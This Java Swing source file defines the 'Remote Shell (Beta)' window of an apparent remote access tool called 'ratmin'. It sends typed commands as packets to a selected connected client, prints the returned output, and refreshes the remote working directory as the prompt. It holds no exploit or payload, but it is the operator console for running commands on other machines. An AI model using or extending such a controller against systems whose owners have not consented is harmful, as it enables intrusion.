package me.slimig.ratmin.user_interface.Ui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;

import javax.swing.JFormattedTextField;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

import me.slimig.ratmin.utils.Packets.Packet;
import net.miginfocom.swing.MigLayout;

public class ShellUi extends JFrame {
    /**
     *
     */
    private static final long serialVersionUID = 6432441509080874469L;
    private static char SPLIT = '\u0000';
    private static String TEXT_NOT_TO_TOUCH = "You can't touch this!";

    public ShellUi() {
        setAlwaysOnTop(true);
        setResizable(false);
        setType(Type.UTILITY);
        getContentPane().setBackground(Color.BLACK);
        setBackground(Color.BLACK);
        setTitle("Remote Shell (Beta)");
        setSize(new Dimension(767, 477));
        getContentPane().setLayout(new MigLayout("", "[761px]", "[35px][][]"));
        new JPanel(new BorderLayout());

        final JTextArea shellcommand = new JTextArea();
        shellcommand.setRows(17);
        shellcommand.setColumns(52);
        shellcommand.setEditable(true);

        shellcommand.setFont(new Font("Tahoma", Font.PLAIN, 16));
        // shellcommand.setHorizontalAlignment(SwingConstants.LEFT);
        shellcommand.setForeground(Color.WHITE);
        shellcommand.setBackground(Color.BLACK);
        shellcommand.setBounds(0, 37, 761, 405);
        // getContentPane().add(shellcommand, "cell 0 2,aligny center");
        JScrollPane scrollPanel = new JScrollPane(shellcommand);
        getContentPane().add(scrollPanel, "cell 0 1");

        final JFormattedTextField ftext = new JFormattedTextField();
        Packet.setCanSend(false);
        Ui.selectedStreams.sendMsg(Packet.DIR.getPacketID());
        Ui.selectedStreams.sendMsg(Packet.DIR.getPacketID());
        TEXT_NOT_TO_TOUCH = Ui.selectedStreams.readMsg() + ">";
        ftext.setText(TEXT_NOT_TO_TOUCH);
        Packet.setCanSend(true);
        ftext.addKeyListener(new KeyAdapter() {
            @Override
            public void keyTyped(KeyEvent e) {
                if (e.getKeyChar() == KeyEvent.VK_BACK_SPACE
                        && (ftext.getText().length() + 1) == TEXT_NOT_TO_TOUCH.length()) {
                    e.consume();
                    ftext.setText(TEXT_NOT_TO_TOUCH);
                }
            }
        });

        ftext.setForeground(Color.WHITE);
        ftext.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent ev) {
                if (!(ftext.getText().isEmpty())) {
                    if (Ui.selectedStreams != null) {
                        shellcommand.setText("");
                        Packet.setCanSend(false);
                        Ui.selectedStreams
                                .sendMsg(Packet.COMMAND.getPacketID() + ftext.getText().replace(TEXT_NOT_TO_TOUCH, ""));
                        while (!Ui.selectedStreams.readMsg().contains(Character.toString(SPLIT))) {
                            shellcommand.setText(shellcommand.getText() + Ui.selectedStreams.readMsg()
                                    .replace("UNKNOWN", "Unknown Command").replace(Character.toString(SPLIT), "")
                                    + "\n");
                        }

                        Ui.selectedStreams.sendMsg(Packet.DIR.getPacketID());
                        Ui.selectedStreams.sendMsg(Packet.DIR.getPacketID());
                        TEXT_NOT_TO_TOUCH = Ui.selectedStreams.readMsg() + ">";
                        ftext.setText("");
                        ftext.setText(TEXT_NOT_TO_TOUCH);
                        Packet.setCanSend(true);
                    }
                }
            }
        });

        ftext.setBackground(Color.BLACK);
        getContentPane().add(ftext, "cell 0 0,grow");

    }

}
